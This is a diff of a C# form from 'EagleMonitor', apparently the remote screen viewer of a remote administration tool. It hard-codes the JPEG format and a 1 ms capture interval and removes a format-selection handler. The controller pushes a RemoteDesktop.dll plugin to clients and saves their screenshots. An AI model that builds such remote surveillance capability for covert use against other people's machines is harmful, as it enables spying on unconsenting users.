@@ -40,7 +40,7 @@ namespace EagleMonitor.Forms
       
         private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
         {
-            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
+            if (captureGuna2ToggleSwitch.Checked)
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                 {
@@ -48,9 +48,9 @@ namespace EagleMonitor.Forms
                     baseIp = this.baseIp,
                     width = viewerPictureBox.Width,
                     height = viewerPictureBox.Height,
-                    format = formatGuna2ComboBox.Text,
+                    format = "JPEG",
                     quality = qualityGuna2TrackBar.Value,
-                    timeMS = interval
+                    timeMS = 1
                 };
 
                 this.loadingCircle1.Visible = true;
@@ -85,7 +85,7 @@ namespace EagleMonitor.Forms
 
         private void qualityGuna2TrackBar_ValueChanged(object sender, EventArgs e)
         {
-            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
+            if (captureGuna2ToggleSwitch.Checked)
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                 {
@@ -93,9 +93,9 @@ namespace EagleMonitor.Forms
                     baseIp = this.baseIp,
                     width = viewerPictureBox.Width,
                     height = viewerPictureBox.Height,
-                    format = formatGuna2ComboBox.Text,
+                    format = "JPEG",
                     quality = qualityGuna2TrackBar.Value,
-                    timeMS = interval
+                    timeMS = 1
                 };
 
                 this.clientHandler.SendPacket(remoteViewerPacket);
@@ -104,7 +104,7 @@ namespace EagleMonitor.Forms
 
         private void viewerPictureBox_SizeChanged(object sender, EventArgs e)
         {
-            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
+            if (captureGuna2ToggleSwitch.Checked)
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                 {
@@ -112,42 +112,19 @@ namespace EagleMonitor.Forms
                     baseIp = this.baseIp,
                     width = viewerPictureBox.Width,
                     height = viewerPictureBox.Height,
-                    format = formatGuna2ComboBox.Text,
+                    format = "JPEG",
                     quality = qualityGuna2TrackBar.Value,
-                    timeMS = interval
+                    timeMS = 1
                 };
 
                 this.clientHandler.SendPacket(remoteViewerPacket);
             }
         }
 
-        private void formatGuna2ComboBox_SelectedIndexChanged(object sender, EventArgs e)
-        {
-            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
-            {
-                if(formatGuna2ComboBox.Text == "PNG" || formatGuna2ComboBox.Text == "GIF")
-                    qualityGuna2TrackBar.Enabled = false;
-                else
-                    qualityGuna2TrackBar.Enabled = true;
-
-                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
-                {
-                    baseIp = this.baseIp,
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
-                    width = viewerPictureBox.Width,
-                    height = viewerPictureBox.Height,
-                    format = formatGuna2ComboBox.Text,
-                    quality = qualityGuna2TrackBar.Value,
-                    timeMS = interval
-                };
-
-                this.clientHandler.SendPacket(remoteViewerPacket);
-            }
-        }
 
         private void intervalGuna2TextBox_TextChanged(object sender, EventArgs e)
         {
-            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked) 
+            if (captureGuna2ToggleSwitch.Checked) 
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON)
                 {
@@ -155,9 +132,9 @@ namespace EagleMonitor.Forms
                     plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1),
                     width = viewerPictureBox.Width,
                     height = viewerPictureBox.Height,
-                    format = formatGuna2ComboBox.Text,
+                    format = "JPEG",
                     quality = qualityGuna2TrackBar.Value,
-                    timeMS = interval
+                    timeMS = 1
                 };
 
                 this.clientHandler.SendPacket(remoteViewerPacket);
@@ -296,12 +273,12 @@ namespace EagleMonitor.Forms
 
             string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();
 
-            File.WriteAllBytes(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots\\" + Date + "." + this.formatGuna2ComboBox.Text.ToLower(), PacketLib.Utils.ImageProcessing.ImageToBytes(this.viewerPictureBox.Image));
+            File.WriteAllBytes(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots\\" + Date + ".jpeg", PacketLib.Utils.ImageProcessing.ImageToBytes(this.viewerPictureBox.Image));
         }
 
         private void closeButton_Click(object sender, EventArgs e)
         {
-            if (captureGuna2ToggleSwitch.Checked)
+            if (captureGuna2ToggleSwitch.Checked || clientHandler != null)
             {
                 RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF)
                 {
